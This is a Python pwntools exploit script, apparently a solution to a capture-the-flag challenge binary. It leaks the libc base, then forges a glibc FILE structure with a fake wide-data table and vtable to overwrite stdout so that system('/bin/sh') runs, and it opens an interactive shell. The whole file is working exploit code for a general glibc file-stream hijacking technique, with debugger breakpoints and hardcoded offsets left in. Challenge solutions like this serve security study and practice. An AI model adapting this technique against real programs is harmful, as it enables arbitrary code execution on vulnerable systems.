from pwn import *

r = process("./chall")
e = ELF("./chall")
libc = e.libc

# get libc
r.recvuntil(b'@ ')
libc_base = int(r.recvline().strip(), 16) - libc.symbols['puts']
log.info("libc_base: %#x" % libc_base)

# calc
stdout = libc_base + libc.symbols['_IO_2_1_stdout_']
stdout_lock = libc_base + 0x7ffff7f91a70 - 0x7ffff7d76000
system = libc_base + libc.symbols['system']

# overwrite stdout
#gdb.attach(r, 'b *0x555555555222')
gdb.attach(r, 'b *0x7ffff7dfc437')

input(">>")

def pack_file(_flags = 0,
              _IO_read_ptr = 0,
              _IO_read_end = 0,
              _IO_read_base = 0,
              _IO_write_base = 0,
              _IO_write_ptr = 0,
              _IO_write_end = 0,
              _IO_buf_base = 0,
              _IO_buf_end = 0,
              _IO_save_base = 0,
              _IO_backup_base = 0,
              _IO_save_end = 0,
              _IO_marker = 0,
              _IO_chain = 0,
              _fileno = 0,
              _lock = 0,
              _wide_data = 0,
              _mode = 0):
    #file_struct = p32(_flags) + \
    #         p32(0) + \
    file_struct = p64(_flags) + \
             p64(_IO_read_ptr) + \
             p64(_IO_read_end) + \
             p64(_IO_read_base) + \
             p64(_IO_write_base) + \
             p64(_IO_write_ptr) + \
             p64(_IO_write_end) + \
             p64(_IO_buf_base) + \
             p64(_IO_buf_end) + \
             p64(_IO_save_base) + \
             p64(_IO_backup_base) + \
             p64(_IO_save_end) + \
             p64(_IO_marker) + \
             p64(_IO_chain) + \
             p32(_fileno)
    file_struct = file_struct.ljust(0x88, b"\x00")
    file_struct += p64(_lock)
    file_struct = file_struct.ljust(0xa0, b"\x00")
    file_struct += p64(_wide_data)
    file_struct = file_struct.ljust(0xc0, b'\x00')
    file_struct += p64(_mode)
    file_struct = file_struct.ljust(0xd8, b"\x00")
    return file_struct

# prepare wide_data
wide_data_ptr = libc_base + 0x7ffff7f8f9a0 - 0x7ffff7d76000 # just a pointer, can be any pointer
fake_vtable_ptr = wide_data_ptr + 0xe8 - 0x68
fake_wide_data = b'\x00'*0xe0 + p64(fake_vtable_ptr) + p64(system)
r.sendafter(b"addr:", p64(wide_data_ptr))
r.sendafter(b"do it:", fake_wide_data)


fake_vtable = libc_base + 0x7ffff7f8bf58 - 0x7ffff7d76000 - 0x38
fake_file_struct = pack_file(_flags=0x3b01010101010101, _IO_read_ptr=u64(b'/bin/sh\x00'), _wide_data=wide_data_ptr, _lock=stdout_lock) + p64(fake_vtable)

r.sendafter(b"addr:", p64(stdout))
r.sendafter(b"do it:", fake_file_struct)
r.interactive()
